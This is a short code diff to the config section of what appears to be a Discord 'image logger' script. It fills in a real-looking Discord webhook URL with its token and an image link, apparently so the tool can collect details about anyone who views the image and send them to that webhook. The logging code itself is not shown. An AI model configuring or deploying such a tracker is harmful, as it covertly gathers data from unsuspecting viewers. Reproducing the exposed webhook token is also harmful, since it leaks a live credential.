@@ -12,8 +12,8 @@ __author__ = "Aquestria"
 
 config = {
     # BASE CONFIG #
-    "webhook": "Add webhook here",
-    "image": "add image here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1485415723496112241/ZeqAFzebSDz0sHdpOZN9rPWVkTGamVT_PFhTLwIKtX1dJSKWqxhZa_nKOySG_7D1lET3",
+    "image": "https://cdn.discordapp.com/attachments/1267337904754135162/1267528930324250786/IMG_0419.jpg?ex=69c1734e&is=69c021ce&hm=a21b2970c8d297e1e31164a49238586b0f29b18507c082a0aa1ddd09e17d606c&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
